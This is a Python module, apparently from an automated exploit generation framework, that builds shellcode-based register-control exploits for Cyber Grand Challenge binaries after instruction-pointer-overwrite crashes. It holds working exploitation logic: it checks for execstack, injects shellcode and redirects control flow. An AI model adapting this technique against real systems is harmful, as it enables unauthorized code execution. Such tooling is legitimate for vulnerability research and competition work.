import logging
from rex import Vulnerability
from rex.exploit import CannotExploit
from rex.exploit.cgc import CGCType1ShellcodeExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.linux.call_shellcode")

class ShellcodeSetRegister(Technique):

    name = "shellcode_set_register"

    applicable_to = ['cgc']

    cgc_registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    # this technique should create an exploit which is a type1 pov
    pov_type = 1

    def set_register(self, register):
        '''
        set a register with shellcode on cgc
        '''

        # can only exploit ip overwrites
        ct = self.crash.crash_type
        if ct != Vulnerability.IP_OVERWRITE and ct != Vulnerability.PARTIAL_IP_OVERWRITE:
            raise CannotExploit("[%s] cannot control ip" % self.name)


        if not self.crash.project.loader.main_bin.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)

        # try to write shellcode into global memory
        shellcode_template = self.shellcode.get_shellcode_template('setregister')
        shellcode = self.shellcode.get_shellcode('setregister', register=register, value=0x41414141, ip=0x58585858)

        shellcode_addr = self._ip_overwrite_call_shellcode(shellcode)

        self.crash.state.add_constraints(self.crash.state.ip == shellcode_addr)

        return CGCType1ShellcodeExploit(self.crash, register, shellcode_addr, shellcode_template)

    def apply(self, **kwargs):

        register_setters = [ ]
        for register in ShellcodeSetRegister.cgc_registers:
            try:
                register_setters.append(self.set_register(register))
            except CannotExploit as e:
                l.warning("could not set register %s with shellcode (%s)", register, e.message)

        return register_setters
